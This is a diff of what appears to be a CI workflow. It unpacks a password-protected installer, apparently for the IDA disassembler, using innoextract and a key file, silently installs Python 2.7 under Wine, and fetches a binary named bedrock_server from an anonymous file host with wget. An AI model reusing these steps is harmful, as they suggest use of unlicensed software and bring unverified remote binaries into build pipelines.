@@ -42,12 +42,14 @@ jobs:
         7z e ida.zip "$IDA/$EXE" "$IDA/$KEY"
 
         tar -xJf innoextract-1.8-linux.tar.xz
-        ./innoextract-1.8-linux/innoextract "$EXE" --silent --exclude-temp --password-file $KEY
+        ./innoextract-1.8-linux/innoextract "$EXE" --silent --password-file $KEY
 
         mv app ida
         rm -rf *.zip innoextract* "$EXE" "$KEY"
         #debug
         ls -lah
+
+        wine64 msiexec /i tmp/python-2.7.13.amd64.msi /qn
 
         wget -q https://www.pastefile.com/download/phn98s -O bedrock_server
 
